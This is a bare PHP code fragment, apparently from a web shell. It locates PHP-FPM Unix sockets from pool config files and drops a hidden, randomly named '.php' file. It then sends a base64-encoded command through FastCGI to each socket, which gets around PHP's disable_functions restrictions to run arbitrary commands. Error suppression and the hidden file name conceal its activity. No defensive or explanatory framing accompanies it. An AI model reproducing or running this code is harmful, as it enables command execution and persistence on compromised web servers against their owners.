    foreach (@glob('/etc/php/*/fpm/pool.d/*.conf') ?: [] as $cf) {
        $cc = @file_get_contents($cf); if ($cc && preg_match('/^listen\s*=\s*(.+)/m', $cc, $lm)) { $l = trim($lm[1]); if ($l[0] === '/') $socks[] = $l; }
    }
    $socks = array_values(array_unique(array_filter($socks, function($s){ return @file_exists($s); })));
    $dir = @realpath(dirname(__FILE__)) ?: dirname(__FILE__);
    $fn = '.ph'.substr(md5(mt_rand()),0,6).'.php';
    $hp = $dir.'/'.$fn;
    @file_put_contents($hp, '');
    if (!@file_exists($hp)) { $hp = sys_get_temp_dir().'/'.$fn; @file_put_contents($hp, ''); }
    if (!@file_exists($hp)) return false;
    $b = urlencode(base64_encode($cmd));
    foreach ($socks as $s) { $o = @fcgi_do('unix://'.$s, $hp, $b); if ($o !== false) { @unlink($hp); return $o; } }
